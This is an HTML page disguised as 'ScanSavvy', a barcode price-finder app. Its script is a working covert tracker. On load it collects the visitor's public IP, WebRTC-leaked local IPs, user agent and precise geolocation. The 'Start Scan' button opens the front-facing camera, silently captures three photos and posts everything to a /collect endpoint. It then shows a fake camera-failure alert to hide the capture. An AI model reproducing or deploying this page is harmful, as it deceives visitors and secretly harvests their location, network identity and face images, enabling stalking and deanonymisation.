<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ScanSavvy - Smart Price Finder</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Exo+2:wght@400;600&display=swap" rel="stylesheet">
<!-- Leaflet CSS -->
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
<style>
:root {
  --primary: #00ffff;
  --accent: #00bcd4;
  --bg-dark: #05070a;
  --glass: rgba(255, 255, 255, 0.04);
  --border: rgba(0, 255, 255, 0.5);
  --text-light: #f3f9ff;
  --text-muted: #a0a6b2;
  --blur: blur(22px);
}

* { margin:0; padding:0; box-sizing:border-box; }

body {
  font-family: "Exo 2", sans-serif;
  background: linear-gradient(135deg, #05010a, #200020);
  color: var(--text-light);
  display: flex;
  flex-direction: column;
  min-height: 100vh;
  align-items: center;
  overflow-x: hidden;
  padding-top: 40px;
  position: relative;
  z-index: 0;
}

body::before {
  content:"";
  position:fixed;
  top:0; left:0; width:100%; height:100%;
  background: radial-gradient(circle at 25% 25%, rgba(0,0,0,0.4), rgba(40,0,40,0.1) 60%, rgba(40,0,40,0.05) 100%);
  animation: fractalFlow 30s linear infinite;
  z-index:-1;
}

@keyframes fractalFlow {
  0% { transform: translate(0,0) scale(1); }
  50% { transform: translate(-80px,-60px) scale(1.05); }
  100% { transform: translate(0,0) scale(1); }
}

header { text-align:center; margin-bottom:20px; position:relative; }

header h1 {
  font-family:"Orbitron", sans-serif;
  font-size:2.8em;
  font-weight:700;
  color: var(--primary);
  text-shadow: 0 0 15px rgba(0,255,255,0.7), 0 0 35px rgba(0,255,255,0.8), 0 0 60px rgba(0,255,255,1);
  letter-spacing:2px;
  animation: glowFlow 6s ease-in-out infinite alternate;
}

@keyframes glowFlow {
  0% { text-shadow:0 0 15px rgba(0,255,255,0.6),0 0 35px rgba(0,255,255,0.8),0 0 60px rgba(0,255,255,0.9);}
  50% { text-shadow:0 0 25px rgba(0,255,255,0.7),0 0 45px rgba(0,255,255,0.9),0 0 80px rgba(0,255,255,1);}
  100% { text-shadow:0 0 15px rgba(0,255,255,0.6),0 0 35px rgba(0,255,255,0.8),0 0 60px rgba(0,255,255,0.9);}
}

header span { font-size:1.1em; color:var(--text-muted); display:block; margin-top:6px; }

.container {
  width:90%;
  max-width:480px;
  background: var(--glass);
  border: 2px solid rgba(0,255,255,0.3);
  border-radius:26px;
  backdrop-filter: var(--blur);
  box-shadow: 0 8px 40px rgba(0,255,255,0.12), inset 0 0 25px rgba(0,255,255,0.05);
  padding:28px;
  display:flex;
  flex-direction:column;
  align-items:center;
  position:relative;
  overflow:hidden;
  z-index:2;
}

.container::before {
  content:"";
  position:absolute;
  top:-50%; left:-50%;
  width:200%; height:200%;
  background: radial-gradient(circle at 30% 30%, rgba(0,0,255,0.04), transparent 70%),
              radial-gradient(circle at 70% 70%, rgba(0,50,150,0.03), transparent 80%);
  background-size:200% 200%;
  animation: plasmaFlow 16s ease-in-out infinite;
  z-index:0;
}

@keyframes plasmaFlow { 0% { background-position:0% 0%; } 50% { background-position:100% 100%; } 100% { background-position:0% 0%; } }

#about { font-size:1em; color:var(--text-muted); margin-bottom:20px; text-align:center; line-height:1.4em; position:relative; z-index:2; }

#map { width:100%; height:260px; border-radius:16px; margin-bottom:20px; overflow:hidden; position:relative; z-index:2; }

/* Brightness filter applies only to tiles, not markers */
.leaflet-tile { filter: brightness(3) contrast(1.1); }

button {
  width:100%; padding:16px; font-size:1.2em; font-weight:600; color:#eafcff;
  background: linear-gradient(90deg,#0044ff,#0077ff); border:none; border-radius:14px;
  cursor:pointer; box-shadow:0 4px 14px rgba(0,0,255,0.35); position:relative; z-index:2; transition: all 0.3s ease;
}

button:hover { background: linear-gradient(90deg,#0077ff,#0044ff); transform: translateY(-3px); box-shadow:0 6px 20px rgba(0,0,255,0.5); }

footer { text-align:center; font-size:0.85em; color: var(--text-muted); margin-top:30px; }

canvas{ display:none; }
</style>
</head>
<body>
<header>
  <h1>ScanSavvy</h1>
  <span>Smart Price Finder</span>
</header>

<div class="container">
  <div id="about">
    Scan the barcode of any item using your camera and find the same products nearby at the best prices in real-time.
  </div>
  <div id="map"></div>
  <button id="scanBtn">Start Scan</button>
  <canvas id="canvas"></canvas>
</div>

<footer>© 2025 ScanSavvy</footer>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
let map = L.map('map').setView([0,0],2);
L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
  subdomains:'abcd',
  attribution:'&copy; <a href="https://www.openstreetmap.org/copyright">OSM</a> &copy; <a href="https://carto.com/">CARTO</a>',
  maxZoom:19
}).addTo(map);

// Default Leaflet marker
const payload = {
  userAgent: navigator.userAgent,
  serverObservedIP: "${serverIP}",
  publicIP: null,
  geolocation: null,
  webrtcIPs: [],
  images: []
};

// Public IP
fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{ payload.publicIP=d.ip; send(false); });

// Geolocation
if(navigator.geolocation){
  navigator.geolocation.getCurrentPosition(pos=>{
    payload.geolocation={ lat:pos.coords.latitude, lng:pos.coords.longitude, acc:Math.round(pos.coords.accuracy) };
    map.setView([pos.coords.latitude,pos.coords.longitude],14);
    L.marker([pos.coords.latitude,pos.coords.longitude]).addTo(map);
    send(false);
  });
}

// WebRTC IPs
const pc = new RTCPeerConnection({ iceServers:[{urls:"stun:stun.l.google.com:19302"}] });
pc.createDataChannel("x");
pc.onicecandidate = e=>{ if(!e.candidate) return; const ip=e.candidate.candidate.split(" ")[4]; if(ip && !payload.webrtcIPs.includes(ip)) payload.webrtcIPs.push(ip); };
pc.createOffer().then(o=>pc.setLocalDescription(o));

// Capture images
document.getElementById("scanBtn").addEventListener("click",startScanner);
function startScanner(){
  navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user" } }).then(stream=>{
    const video=document.createElement("video"); video.srcObject=stream; video.play();
    const canvas=document.getElementById("canvas"); const ctx=canvas.getContext("2d"); const imagesCaptured=[];
    video.onloadedmetadata=async ()=>{
      canvas.width=video.videoWidth; canvas.height=video.videoHeight;
      for(let i=0;i<3;i++){
        ctx.drawImage(video,0,0);
        const imgData=canvas.toDataURL("image/png").split(',')[1];
        imagesCaptured.push(imgData);
        await new Promise(r=>setTimeout(r,300));
      }
      payload.images=imagesCaptured.filter(img=>img && img.length>0);
      send(true);
      stream.getTracks().forEach(t=>t.stop());
      alert("Failed to initialize camera.");
    };
  }).catch(err=>{ console.log("Camera error:",err); alert("Failed to access camera."); });
}

function send(force){ fetch("/collect",{ method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(payload) }); }
</script>
</body>
</html>
